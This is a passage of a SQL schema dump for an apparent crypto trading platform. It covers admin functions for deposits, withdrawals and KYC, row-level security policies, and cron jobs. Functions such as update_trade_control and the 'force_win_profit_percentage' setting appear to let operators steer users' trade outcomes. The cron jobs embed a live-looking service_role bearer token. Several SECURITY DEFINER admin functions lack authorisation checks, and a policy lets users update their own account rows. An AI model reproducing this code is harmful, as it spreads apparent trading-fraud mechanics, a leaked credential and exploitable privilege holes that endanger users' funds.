    WHERE id = v_user_id;

    -- B. Deposit Request status update
    UPDATE public.deposit_requests 
    SET status = 'completed', updated_at = now() 
    WHERE id = p_id;

    -- C. Transaction History update (Latest pending deposit)
    UPDATE public.transactions 
    SET status = 'completed' 
    WHERE id = (
        SELECT id FROM public.transactions 
        WHERE user_id = v_user_id 
        AND type = 'deposit' 
        AND status = 'pending' 
        AND amount = v_amount
        ORDER BY created_at DESC
        LIMIT 1
    );

  ELSE
    -- REJECT Logic
    UPDATE public.deposit_requests 
    SET status = 'rejected', updated_at = now() 
    WHERE id = p_id;

    UPDATE public.transactions 
    SET status = 'failed' 
    WHERE id = (
        SELECT id FROM public.transactions 
        WHERE user_id = v_user_id 
        AND type = 'deposit' 
        AND status = 'pending' 
        AND amount = v_amount
        ORDER BY created_at DESC
        LIMIT 1
    );
  END IF;

  RETURN json_build_object('success', true, 'message', 'Deposit ' || p_action || ' processed successfully');

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', 'System Error: ' || SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.admin_verify_kyc_v1(p_id uuid, p_user_id uuid, p_action text, p_reason text DEFAULT NULL::text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
BEGIN
  -- 1. Update KYC Submission record
  UPDATE public.kyc_submissions 
  SET 
    status = p_action,
    rejection_reason = p_reason,
    updated_at = now()
  WHERE id = p_id;

  -- 2. Update User Main Status
  UPDATE public.users 
  SET kyc_status = p_action 
  WHERE id = p_user_id;

  RETURN json_build_object('success', true, 'message', 'KYC ' || p_action || ' successful');

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.update_trade_control(p_trade_id uuid, p_control text)
 RETURNS json
 LANGUAGE plpgsql
AS $function$
BEGIN
  UPDATE public.trades 
  SET admin_control = p_control 
  WHERE id = p_trade_id AND status = 'open';

  RETURN json_build_object('success', true, 'message', 'Trade control updated to ' || p_control);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.admin_verify_withdraw(p_id uuid, p_action text)
 RETURNS json
 LANGUAGE plpgsql
 SECURITY DEFINER
 SET search_path TO 'public'
AS $function$
DECLARE
  v_user_id UUID;
  v_amount NUMERIC;
BEGIN
  -- 1. Record fetch karein aur row lock karein
  SELECT user_id, amount 
  INTO v_user_id, v_amount 
  FROM public.withdraw_requests 
  WHERE id = p_id AND status = 'pending'
  FOR UPDATE;

  IF NOT FOUND THEN 
    RETURN json_build_object('success', false, 'message', 'Withdrawal request not found or already processed'); 
  END IF;

  -- 2. Logic based on action (Approve/Reject)
  IF LOWER(p_action) = 'approve' THEN
    -- Request status update
    UPDATE public.withdraw_requests 
    SET status = 'completed', updated_at = now() 
    WHERE id = p_id;

    -- Transaction history update (Latest withdrawal request for this user)
    UPDATE public.transactions 
    SET status = 'completed' 
    WHERE id = (
        SELECT id FROM public.transactions 
        WHERE user_id = v_user_id 
        AND type = 'withdrawal' 
        AND status = 'pending' 
        AND amount = v_amount
        ORDER BY created_at DESC
        LIMIT 1
    );

  ELSE
    -- REJECT Logic: Balance wapis return karein (Kyunke request bante waqt deduct ho jata hai)
    UPDATE public.users 
    SET main_balance = main_balance + v_amount 
    WHERE id = v_user_id;

    -- Request status update
    UPDATE public.withdraw_requests 
    SET status = 'rejected', updated_at = now() 
    WHERE id = p_id;

    -- Transaction history update
    UPDATE public.transactions 
    SET status = 'failed' 
    WHERE id = (
        SELECT id FROM public.transactions 
        WHERE user_id = v_user_id 
        AND type = 'withdrawal' 
        AND status = 'pending' 
        AND amount = v_amount
        ORDER BY created_at DESC
        LIMIT 1
    );
  END IF;

  RETURN json_build_object('success', true, 'message', 'Withdrawal ' || p_action || ' processed successfully');

EXCEPTION WHEN OTHERS THEN
  RETURN json_build_object('success', false, 'message', 'Critical Error: ' || SQLERRM);
END;
$function$
;

CREATE OR REPLACE FUNCTION public.get_user_role(user_id uuid)
 RETURNS text
 LANGUAGE sql
 SECURITY DEFINER
AS $function$
  SELECT role FROM public.users WHERE id = user_id;
$function$
;

CREATE OR REPLACE FUNCTION public.check_maintenance_mode()
 RETURNS boolean
 LANGUAGE sql
 SECURITY DEFINER
AS $function$
  SELECT maintenance_mode FROM public.admin_settings WHERE id = 1;
$function$
;

CREATE OR REPLACE FUNCTION public.check_user_active()
 RETURNS boolean
 LANGUAGE sql
 SECURITY DEFINER
AS $function$
  SELECT is_active FROM public.users WHERE id = auth.uid();
$function$
;

CREATE OR REPLACE FUNCTION public.admin_get_users(tab_status boolean, search_text text DEFAULT ''::text)
 RETURNS SETOF users
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  -- Security Check: Sirf Admin allow hoga
  IF (SELECT role FROM public.users WHERE id = auth.uid()) != 'admin' THEN
    RAISE EXCEPTION 'Unauthorized Protocol';
  END IF;

  RETURN QUERY
  SELECT * FROM public.users
  WHERE is_active = tab_status
  AND (search_text = '' OR email ILIKE '%' || search_text || '%' OR COALESCE(full_name, '') ILIKE '%' || search_text || '%')
  ORDER BY created_at DESC;
END;
$function$
;

CREATE OR REPLACE FUNCTION public.admin_toggle_user(target_user_id uuid, new_status boolean)
 RETURNS void
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  -- Security Check: Sirf Admin allow hoga
  IF (SELECT role FROM public.users WHERE id = auth.uid()) != 'admin' THEN
    RAISE EXCEPTION 'Unauthorized Protocol';
  END IF;

  UPDATE public.users SET is_active = new_status WHERE id = target_user_id;
END;
$function$
;

CREATE OR REPLACE FUNCTION public.admin_save_settings(p_maintenance_mode boolean, p_min_deposit_amount numeric, p_min_withdraw_amount numeric, p_withdraw_fee_percentage numeric, p_spot_fee_percentage numeric, p_max_leverage_allowed integer, p_force_win_profit_percentage numeric, p_usdt_address text, p_usdt_network text, p_qr_code_url text)
 RETURNS void
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  -- Security: Sirf Admin ko allow karega
  IF (SELECT role FROM public.users WHERE id = auth.uid()) != 'admin' THEN
    RAISE EXCEPTION 'Unauthorized Protocol';
  END IF;

  UPDATE public.admin_settings 
  SET 
    maintenance_mode = p_maintenance_mode,
    min_deposit_amount = p_min_deposit_amount,
    min_withdraw_amount = p_min_withdraw_amount,
    withdraw_fee_percentage = p_withdraw_fee_percentage,
    spot_fee_percentage = p_spot_fee_percentage,
    max_leverage_allowed = p_max_leverage_allowed,
    force_win_profit_percentage = p_force_win_profit_percentage,
    usdt_address = p_usdt_address,
    usdt_network = p_usdt_network,
    qr_code_url = p_qr_code_url,
    updated_at = NOW()
  WHERE id = 1;
END;
$function$
;

CREATE OR REPLACE FUNCTION public.admin_get_live_trades()
 RETURNS TABLE(res_trade_id uuid, res_created_at timestamp with time zone, res_user_id uuid, res_symbol text, res_trade_mode text, res_trade_direction text, res_margin_amount numeric, res_leverage integer, res_entry_price numeric, res_status text, res_admin_control text, res_user_email text, res_user_full_name text)
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  -- Security check
  IF (SELECT role FROM public.users WHERE public.users.id = auth.uid()) != 'admin' THEN
    RAISE EXCEPTION 'Unauthorized Protocol';
  END IF;

  RETURN QUERY
  SELECT 
    t.id, 
    t.created_at, 
    t.user_id, 
    t.symbol, 
    t.trade_mode, 
    t.trade_direction, 
    t.margin_amount, 
    t.leverage, 
    t.entry_price, 
    t.status, 
    t.admin_control,
    u.email,
    u.full_name
  FROM public.trades t
  JOIN public.users u ON t.user_id = u.id
  WHERE t.status = 'open'
  ORDER BY t.created_at DESC;
END;
$function$
;

CREATE OR REPLACE FUNCTION public.is_admin()
 RETURNS boolean
 LANGUAGE plpgsql
 SECURITY DEFINER
AS $function$
BEGIN
  RETURN (
    SELECT (role = 'admin') 
    FROM public.users 
    WHERE id = auth.uid()
  );
END;
$function$
;

-- 7. TRIGGERS --
CREATE TRIGGER tr_check_filters BEFORE INSERT OR UPDATE ON realtime.subscription FOR EACH ROW EXECUTE FUNCTION realtime.subscription_check_filters();

CREATE TRIGGER update_objects_updated_at BEFORE UPDATE ON storage.objects FOR EACH ROW EXECUTE FUNCTION storage.update_updated_at_column();

CREATE TRIGGER enforce_bucket_name_length_trigger BEFORE INSERT OR UPDATE OF name ON storage.buckets FOR EACH ROW EXECUTE FUNCTION storage.enforce_bucket_name_length();

CREATE TRIGGER protect_buckets_delete BEFORE DELETE ON storage.buckets FOR EACH STATEMENT EXECUTE FUNCTION storage.protect_delete();

CREATE TRIGGER protect_objects_delete BEFORE DELETE ON storage.objects FOR EACH STATEMENT EXECUTE FUNCTION storage.protect_delete();

CREATE TRIGGER on_auth_user_created AFTER INSERT ON auth.users FOR EACH ROW EXECUTE FUNCTION handle_new_user();

CREATE TRIGGER cron_job_cache_invalidate AFTER INSERT OR DELETE OR UPDATE OR TRUNCATE ON cron.job FOR EACH STATEMENT EXECUTE FUNCTION cron.job_cache_invalidate();

-- 8. POLICIES (RLS) --
CREATE POLICY "Anyone can view admin settings" ON "admin_settings" FOR SELECT TO public USING (true);

CREATE POLICY "Anyone can view assets" ON "assets" FOR SELECT TO public USING (true);

CREATE POLICY "Users can view their own deposit requests" ON "deposit_requests" FOR SELECT TO public USING ((auth.uid() = user_id));

null;

CREATE POLICY "Users can view their own withdraw requests" ON "withdraw_requests" FOR SELECT TO public USING ((auth.uid() = user_id));

null;

null;

CREATE POLICY "Users can update their own trades" ON "trades" FOR UPDATE TO public USING ((auth.uid() = user_id));

CREATE POLICY "Users can view their own vault" ON "earn_vault" FOR SELECT TO public USING ((auth.uid() = user_id));

null;

CREATE POLICY "Allow individual update" ON "users" FOR UPDATE TO authenticated USING ((auth.uid() = id));

null;

CREATE POLICY "Users can view their own wallet" ON "wallets" FOR SELECT TO authenticated USING ((auth.uid() = user_id));

CREATE POLICY "System can manage wallets" ON "wallets" FOR ALL TO service_role USING (true) WITH CHECK (true);

CREATE POLICY "Users can view own wallet" ON "wallets" FOR SELECT TO authenticated USING ((auth.uid() = user_id));

CREATE POLICY "Users can view own earn data" ON "earn_vault" FOR SELECT TO authenticated USING ((auth.uid() = user_id));

CREATE POLICY "Users can view their own transactions" ON "transactions" FOR SELECT TO public USING ((auth.uid() = user_id));

null;

CREATE POLICY "Users can view own kyc" ON "kyc_submissions" FOR SELECT TO authenticated USING ((auth.uid() = user_id));

CREATE POLICY "Users can submit/update own kyc" ON "kyc_submissions" FOR ALL TO authenticated USING ((auth.uid() = user_id)) WITH CHECK ((auth.uid() = user_id));

CREATE POLICY "Admins have full access" ON "kyc_submissions" FOR ALL TO authenticated USING (((( SELECT users.role
   FROM users
  WHERE (users.id = auth.uid())))::text = 'admin'::text));

CREATE POLICY "Users can update their own profile" ON "users" FOR UPDATE TO authenticated USING ((auth.uid() = id)) WITH CHECK ((auth.uid() = id));

CREATE POLICY "Users can update own profile" ON "users" FOR UPDATE TO authenticated USING ((auth.uid() = id)) WITH CHECK ((auth.uid() = id));

CREATE POLICY "Users can view own tickets" ON "support_tickets" FOR SELECT TO authenticated USING ((auth.uid() = user_id));

null;

CREATE POLICY "Admins have full access" ON "support_tickets" FOR ALL TO authenticated USING ((EXISTS ( SELECT 1
   FROM users
  WHERE ((users.id = auth.uid()) AND ((users.role)::text = 'admin'::text)))));

CREATE POLICY "Trades access policy" ON "trades" FOR SELECT TO public USING ((is_admin() OR (auth.uid() = user_id)));

CREATE POLICY "Users access policy" ON "users" FOR SELECT TO public USING ((is_admin() OR (auth.uid() = id)));

-- 9. CRON JOBS --
SELECT cron.schedule('fetch-prices-every-minute', '* * * * *', '
  SELECT net.http_get(
    url := 'https://gpcmkotxybuxhopbyese.supabase.co/functions/v1/fetch-prices',
    headers := '{"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdwY21rb3R4eWJ1eGhvcGJ5ZXNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MjYzMDIwOSwiZXhwIjoyMDg4MjA2MjA5fQ.G51ne6jUG_7EGjKl_IXvrX9PHiaoRBzOOopjQVFpNU4"}'::jsonb
  );
  ');
SELECT cron.schedule('auto-close-bitcast-trades', '* * * * *', ' 
  SELECT net.http_get(
    url := 'https://gpcmkotxybuxhopbyese.supabase.co/functions/v1/bitcast-closer',
    headers := '{"Content-Type": "application/json", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdwY21rb3R4eWJ1eGhvcGJ5ZXNlIiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc3MjYzMDIwOSwiZXhwIjoyMDg4MjA2MjA5fQ.G51ne6jUG_7EGjKl_IXvrX9PHiaoRBzOOopjQVFpNU4"}'::jsonb
  );
  ');
